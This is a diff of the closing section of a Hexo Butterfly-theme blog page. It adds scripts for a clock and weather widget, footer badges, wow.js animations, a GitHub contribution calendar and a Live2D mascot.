+    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock_anzhiyu')
+    if(parent_div_git) {
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var qweather_key = 'b16a1fa0e63c46a4b8f28abfb06ae3fe';
+  var gaud_map_key = 'e2b04289e870b005374ee030148d64fd&s=rsv3';
+  var baidu_ak_key = 'undefined';
+  var flag = 0;
+  var clock_rectangle = '112.982279,28.19409';
+  var clock_default_rectangle_enable = 'false';
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_anzhiyu_injector_config();
+  }
+  </script><script src="https://widget.qweather.net/simple/static/js/he-simple-common.js?v=2.0"></script><script data-pjax src="https://cdn.cbd.int/hexo-butterfly-clock-anzhiyu/lib/clock.min.js"></script><script data-pjax>
+  function butterfly_footer_beautify_injector_config(){
+    var parent_div_git = document.getElementById('footer-wrap');
+    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/湘ICP备-2022004213号-e1d492?style=flat&amp;logo=data:image/png;base64,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" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" style="margin-inline:5px" data-title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&amp;logo=Claris" alt=""/></a></p>';
+    console.log('已挂载butterfly_footer_beautify')
+    parent_div_git.insertAdjacentHTML("beforeend",item_html)
+    }
+  var elist = 'null'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_footer_beautify_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_footer_beautify_injector_config();
+  }
+  </script><script async src="/js/runtime/runtime.min.js"></script><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '30');
+    arr[i].setAttribute('data-wow-iteration', '1');
+  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__zoomIn');
+    arr[i].setAttribute('data-wow-duration', '');
+    arr[i].setAttribute('data-wow-delay', '200ms');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__slideInRight');
+    arr[i].setAttribute('data-wow-duration', '1.5s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__flipInY');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
+for(var i = 0;i<arr.length;i++){
+    arr[i].classList.add('wow');
+    arr[i].classList.add('animate__animated');
+    arr[i].setAttribute('data-wow-duration', '3s');
+    arr[i].setAttribute('data-wow-delay', '');
+    arr[i].setAttribute('data-wow-offset', '');
+    arr[i].setAttribute('data-wow-iteration', '');
+  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script async src="/js/ali_font.js"></script><script data-pjax src="https://cdn.cbd.int/hexo-filter-gitcalendar/lib/gitcalendar.js"></script><script data-pjax>
+  function gitcalendar_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><style>#git_container{min-height: 280px}@media screen and (max-width:650px) {#git_container{min-height: 0px}}</style><div id="git_loading" style="width:10%;height:100%;margin:0 auto;display: block;"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animatetransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animatetransform></path></svg><style>#git_container{display: none;}</style></div><div id="git_container"></div></div>';
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      console.log('已挂载gitcalendar')
+      }
+
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+        gitcalendar_injector_config()
+        GitCalendarInit("https://python-github-calendar-api-spk83h666-anzhiyu-c.vercel.app/api?ke1nys",['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'],'ke1nys')
+    }
+  </script><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body></html>
